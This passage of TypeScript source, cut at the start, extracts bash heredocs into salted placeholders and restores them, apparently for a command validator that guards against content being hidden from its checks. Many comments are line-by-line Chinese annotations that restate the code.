    // <<EOF's expansion) into the placeholder, hiding it from validators.
    //
    // The insideSkipped check above doesn't catch this because the quoted
    // operator's startIndex is on the command line BEFORE contentStart.
    // The contentStartPositions dedup check below doesn't catch it because the
    // skipped heredoc is in skippedHeredocRanges, not topLevelHeredocs.
    let overlapsSkipped = false
    for (const skipped of skippedHeredocRanges) {
      // Ranges [a,b) and [c,d) overlap iff a < d && c < b
      if (
        contentStartIndex < skipped.contentEndIndex &&
        skipped.contentStartIndex < contentEndIndex
      ) {
        overlapsSkipped = true
        break
      }
    }
    if (overlapsSkipped) {
      continue
    }

    // Build fullText: operator + newline + content (normalized form for restoration)
    // This creates a clean heredoc that can be restored correctly
    const operatorText = command.slice(startIndex, operatorEndIndex)
    const contentText = command.slice(contentStartIndex, contentEndIndex)
    const fullText = operatorText + contentText

    heredocMatches.push({
      fullText,
      delimiter,
      operatorStartIndex: startIndex,
      operatorEndIndex,
      contentStartIndex,
      contentEndIndex,
    })
  }

  // If no valid heredocs found, return original
  if (heredocMatches.length === 0) {
    return { processedCommand: command, heredocs }
  }

  // Filter out nested heredocs - any heredoc whose operator starts inside
  // another heredoc's content range should be excluded.
  // This prevents corruption when heredoc content contains << patterns.
  const topLevelHeredocs = heredocMatches.filter((candidate, _i, all) => {
    // Check if this candidate's operator is inside any other heredoc's content
    for (const other of all) {
      if (candidate === other) continue
      // Check if candidate's operator starts within other's content range
      if (
        candidate.operatorStartIndex > other.contentStartIndex &&
        candidate.operatorStartIndex < other.contentEndIndex
      ) {
        // This heredoc is nested inside another - filter it out
        return false
      }
    }
    return true
  })

  // If filtering removed all heredocs, return original
  if (topLevelHeredocs.length === 0) {
    return { processedCommand: command, heredocs }
  }

  // Check for multiple heredocs sharing the same content start position
  // (i.e., on the same line). This causes index corruption during replacement
  // because indices are calculated on the original string but applied to
  // a progressively modified string. Return without extraction - the fallback
  // is safe (requires manual approval or fails parsing).
  const contentStartPositions = new Set(
    topLevelHeredocs.map(h => h.contentStartIndex),
  )
  if (contentStartPositions.size < topLevelHeredocs.length) {
    return { processedCommand: command, heredocs }
  }

  // Sort by content end position descending so we can replace from end to start
  // (this preserves indices for earlier replacements)
  topLevelHeredocs.sort((a, b) => b.contentEndIndex - a.contentEndIndex)

  // Generate a unique salt for this extraction to prevent placeholder collisions
  // with literal "__HEREDOC_N__" text in commands
  const salt = generatePlaceholderSalt()

  let processedCommand = command
  topLevelHeredocs.forEach((info, index) => {
    // Use reverse index since we sorted descending
    const placeholderIndex = topLevelHeredocs.length - 1 - index
    const placeholder = `${HEREDOC_PLACEHOLDER_PREFIX}${placeholderIndex}_${salt}${HEREDOC_PLACEHOLDER_SUFFIX}`

    // heredocs.set写入新的状态值，使共享工具后续读取保持一致。
    heredocs.set(placeholder, info)

    // Replace heredoc with placeholder while preserving same-line content:
    // - Keep everything before the operator
    // - Replace operator with placeholder
    // - Keep content between operator and heredoc content (e.g., " && echo done")
    // - Remove the heredoc content (from newline through closing delimiter)
    // - Keep everything after the closing delimiter
    // 共享工具 heredoc处理 `processedCommand =`，完成这一小步状态转换。
    processedCommand =
      processedCommand.slice(0, info.operatorStartIndex) +
      placeholder +
      processedCommand.slice(info.operatorEndIndex, info.contentStartIndex) +
      processedCommand.slice(info.contentEndIndex)
  })

  // 返回 { processedCommand, heredocs }，把共享工具这个分支的结果交还调用方。
  return { processedCommand, heredocs }
}

/**
 * Restores heredoc placeholders back to their original content in a single string.
 * Internal helper used by restoreHeredocs.
 */
// restoreHeredocsInString 承担共享工具中的独立步骤，串起共享工具 heredoc需要的输入整理、状态更新和结果输出。
function restoreHeredocsInString(
  text: string,
  heredocs: Map<string, HeredocInfo>,
): string {
  // 结果保存`text`，供共享工具 heredoc后续步骤使用。
  let result = text
  // 遍历 const [placeholder, info] of heredocs，让共享工具逐项完成同一类处理。
  for (const [placeholder, info] of heredocs) {
    // 结果更新为 `result.replaceAll(placeholder, info.fullText)`，确保Bash 解析后续读取最新状态。
    result = result.replaceAll(placeholder, info.fullText)
  }
  // 返回 result，把共享工具这个分支的结果交还调用方。
  return result
}

/**
 * Restores heredoc placeholders in an array of strings.
 *
 * @param parts - Array of strings that may contain heredoc placeholders
 * @param heredocs - The map of placeholders from `extractHeredocs`
 * @returns New array with placeholders replaced by original heredoc content
 */
// restoreHeredocs 承担共享工具中的独立步骤，串起共享工具 heredoc需要的输入整理、状态更新和结果输出。
export function restoreHeredocs(
  parts: string[],
  heredocs: Map<string, HeredocInfo>,
): string[] {
  // 满足 `heredocs.size === 0` 时，共享工具执行该分支。
  if (heredocs.size === 0) {
    // 返回 parts，把共享工具这个分支的结果交还调用方。
    return parts
  }

  // 返回 parts.map(part => restoreHeredocsInString(part, heredocs))，把共享工具这个分支的结果交还调用方。
  return parts.map(part => restoreHeredocsInString(part, heredocs))
}

/**
 * Checks if a command contains heredoc syntax.
 *
 * This is a quick check that doesn't validate the heredoc is well-formed,
 * just that the pattern exists.
 *
 * @param command - The shell command string
 * @returns true if the command appears to contain heredoc syntax
 */
// containsHeredoc 承担共享工具中的独立步骤，串起共享工具 heredoc需要的输入整理、状态更新和结果输出。
export function containsHeredoc(command: string): boolean {
  // 返回 HEREDOC_START_PATTERN.test(command)，把共享工具这个分支的结果交还调用方。
  return HEREDOC_START_PATTERN.test(command)
}
